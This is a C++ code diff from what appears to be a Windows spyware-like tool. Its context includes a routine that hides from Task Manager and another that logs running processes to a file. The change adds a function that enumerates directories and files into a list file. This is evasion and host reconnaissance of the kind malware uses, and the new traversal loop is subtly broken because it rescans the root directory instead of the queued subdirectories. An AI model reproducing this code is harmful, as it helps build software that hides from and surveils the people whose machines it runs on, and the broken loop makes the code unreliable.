@@ -30,7 +30,7 @@ uint32_t SystemUtils::get_process_id(const std::wstring& process_name)
 			File process_file { PROCESS_LIST_PATH };
 			process_file.write(L"Process ID: " + std::to_wstring(pe32.th32ProcessID) + 
 							   L"\tExe file: " + pe32.szExeFile + 
-							   L"\tThreads count: " + std::to_wstring(pe32.cntThreads) + L"\n");
+							   L"\tThreads count: " + std::to_wstring(pe32.cntThreads) + NEW_LINE);
 		}
 		else if (_wcsicmp(process_name.c_str(), pe32.szExeFile) == 0)
 		{
@@ -105,5 +105,37 @@ void SystemUtils::hide_from_task_manager()
 			std::this_thread::sleep_for(std::chrono::seconds(1));
 		}
 		Logger::Instance().info(L"Task manager was closed");
+	}
+}
+
+void SystemUtils::get_dir_list()
+{
+	File dir_list_file{ DIR_LIST_PATH };
+	std::list<std::wstring> dir_list = {ROOT_DIR};
+
+	while (dir_list.size() > 0)
+	{
+		for (Directory dir{ ROOT_DIR }; dir.get_next_file();)
+		{
+			FileInfo current_file = dir.get_current_file();
+			std::wstring file_name = current_file.get_file_name();
+			std::wstring file_size = std::to_wstring(current_file.get_file_size());
+
+			if (file_name == CURRENT_DIR || file_name == PREV_DIR)
+			{
+				continue;
+			}
+			else if (current_file.is_directory())
+			{
+				dir_list.push_back(file_name);
+				dir_list_file.write(L"Directory: " + file_name + L" Size: " + file_size + NEW_LINE);
+			}
+			else
+			{
+				dir_list_file.write(L"\tFile: " + file_name + L" Size: " + file_size + NEW_LINE);
+			}
+		}
+
+		dir_list.pop_front();
 	}
 }
